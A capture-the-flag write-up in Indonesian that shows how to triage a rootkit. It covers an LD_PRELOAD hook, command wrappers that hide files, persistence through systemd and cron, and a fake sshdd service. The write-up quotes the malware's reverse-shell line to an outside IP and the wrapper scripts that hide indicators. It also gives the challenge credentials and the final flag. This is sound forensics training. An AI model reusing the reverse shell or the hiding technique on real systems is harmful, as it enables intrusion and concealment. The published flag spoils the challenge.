## Whisper From The Basement

**Difficulty:** Hard

**Author:** moonetics

**Connect:** `ssh ctf.noctralupra.space -p (port)` — **User:** `root` — **Pass:** `nclpcomprom1sed`

### Description

Sebuah computer berperilaku aneh dan langsung diisolasi dari jaringan. Kamu diberi akses ke klon terkarantina dari mesin tersebut. Akses keluar (egress) ke internet diblokir, jadi segala upaya “call home” akan gagal.

Tugasmu adalah triage DFIR: cari tahu apa yang mengompromikan, bagaimana ia bertahan/bersembunyi, dan pulihkan 2 pesan yang berusaha disamarkan oleh pelaku.

**Hint:** “Hook yang baik sering bersembunyi di tempat yang selalu dibaca loader dinamis. Satu file di /etc bisa membuat direktori ‘terlihat normal’ padahal tidak.”

### Solution

Dari hint, mereferensikan jalur yang selalu disentuh loader dinamis, yaitu `/etc/ld.so.preload`. Di sana terdapat library custom.

**Filesystem & loader.**

```bash
cat /etc/ld.so.preload
# -> /usr/lib/libloadkit.so

# Hindari efek hook saat forensik
LD_PRELOAD= /bin/ls -al /etc
```

**Command Hijacking**

```bash
head -n 2 /usr/bin/ls /bin/ls /usr/bin/ps /usr/bin/find /usr/bin/strings
#!/bin/bash
/usr/bin/ls.idn "$@" | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/ps.idn "$@" | grep -vE "sshdd|kit-update"
/usr/bin/find.idn "$@" 2>/dev/null | grep -vE "Nnc1pl04dkit|sshdd|kit-update"
/usr/bin/strings.idn "$@" | grep -vE "NCLPS1"

# Pakai binari .idn langsung untuk analisis asli
/usr/bin/strings.idn -n 4 /root/quarantine/libloadkit.so | grep -i 'NCLP\|NCLPS1\|idn\|loadkit'
```

**Systemd & cron.**

```bash
systemctl list-unit-files --state=enabled | grep -i nnc1pl
LD_PRELOAD= systemctl cat Nnc1pl04dkit-monitor.service
# ExecStart=/usr/local/bin/Nnc1pl04dkit_monitor.sh

cat /usr/local/bin/Nnc1pl04dkit_monitor.sh
# EXPECTED="/usr/lib/libloadkit.so"; echo ke /etc/ld.so.preload setiap jalan

cat /etc/cron.d/kit-update
# * * * * * root /usr/local/bin/Nnc1pl04dkit_monitor.sh
```

**Reverse shell.**

```bash
LD_PRELOAD= systemctl cat sshdd.service
# ExecStart=/usr/local/sbin/sshdd
LD_PRELOAD= journalctl -u sshdd --no-pager | tail -n 40
# bash -i >& /dev/tcp/47.84.89.245/31102 0>&1 (egress diblok)

# Kunci & indikator lain di .rodata
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# ... "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
LD_PRELOAD= readelf -p .rodata /root/quarantine/libloadkit.so
# ... "readdir", "Nnc1pl04dkit", "sshdd", "ld.so.preload", "kit-update", "NCLPS1", ".idn"
```

Main compromised-nya adalah **rootkit berbasis LD_PRELOAD** yang meng-hook `readdir` untuk menyembunyikan berkas/direktori, ditambah hijacking command (`ls/ps/find/strings`) agar output difilter dari indikator tertentu. Persistensi ganda ditemukan: **systemd timer** yang menulis balik `/etc/ld.so.preload` setiap 30 detik, serta **cron** per menit yang menjalankan skrip preload recover yang sama. Ditemukan juga service palsu, `sshdd.service`, yang mana adalah reverse shell ke `47.84.89.245:31102`.

Solusinya adalah memutus persistensi, menonaktifkan preload saat akuisisi, lalu memulihkan dua pesan.

**Memutus persistensi & menonaktifkan hook sementara.**

```bash
LD_PRELOAD= systemctl stop Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl disable Nnc1pl04dkit-monitor.timer sshdd.service
LD_PRELOAD= systemctl daemon-reload

# bekukan preload & pindahkan artefak
mkdir -p /root/quarantine
mv /usr/lib/libloadkit.so /root/quarantine/ 2>/dev/null || true
cp /etc/ld.so.preload /root/quarantine/ld.so.preload.bak 2>/dev/null || true
: > /etc/ld.so.preload
```

**Menemukan Pesan #1 (kunci XOR).**

```bash
LD_PRELOAD= readelf -p .rodata /root/quarantine/sshdd
# "/bin/bash", "n0ctraLUPRa2025", "/dev/tcp/47.84.89.245/31102"
```

**Memulihkan Pesan #2 (flag) dari part tersembunyi + ciphertext XOR.**
Part awal:

```bash
/usr/bin/ls.idn -al /var/.Nnc1pl04dkit
cat /var/.Nnc1pl04dkit/part1.txt
# NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l
```

Carve ciphertext dari `.data` `sshdd`, buang padding NUL di depan, lalu XOR dengan kunci. Brute-force seluruh kemungkinan shift. Untuk implementasinya adalah kode berikut ini:

```bash
PART1="/var/.Nnc1pl04dkit/part1.txt"
BIN="/root/quarantine/sshdd"
KEY="n0ctraLUPRa2025"

# uji beberapa offset di dalam .data; 0x3010/0x3020 terbukti berisi payload
for OFF in 0x3000 0x3010 0x3020 0x3030 0x3040; do
  dd if="$BIN" of=/tmp/ct.enc bs=1 skip=$((OFF)) count=$((0x100)) status=none 2>/dev/null || continue
  perl -0777 -ne 'BEGIN{binmode STDIN; binmode STDOUT} s/^\x00+//; print' /tmp/ct.enc > /tmp/ct.trim

  for S in $(seq 0 $(( ${#KEY} - 1 ))); do
    K="$KEY" S="$S" perl -0777 -ne '
      BEGIN{ binmode STDIN; binmode STDOUT; $k=$ENV{K}; $kl=length $k; $off=int($ENV{S}); }
      $buf=$_; $l=length $buf;
      for (my $i=0; $i<$l; $i++){
        substr($buf,$i,1)=chr( ord(substr($buf,$i,1)) ^ ord(substr($k,($i+$off)%$kl,1)) );
      }
      print $buf;
    ' /tmp/ct.trim > /tmp/ct.dec

    FLAG=$( printf '%s%s' "$(tr -d '\n' < "$PART1")" "$(tr -d '\n' < /tmp/ct.dec)" \
      | LC_ALL=C grep -aoE 'NCLPS1\{[ -~]{0,200}\}' | head -n 1 )

    if [ -n "$FLAG" ]; then
      echo "$FLAG"
      break 2
    fi
  done
done
```

Output berhasil menunjukkan HIT pada salah satunya di **offset `0x3010` shift `0`**:

```
[+] HIT offset=0x3010 shift=0 NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_lFlag part2: 0tt_p3rs1stenc33_725775ce1c}
```

### Flag

NCLPS1{y1haa_th3_r00k1t_hav3e3e3_aa_l0tt_p3rs1stenc33_725775ce1c}
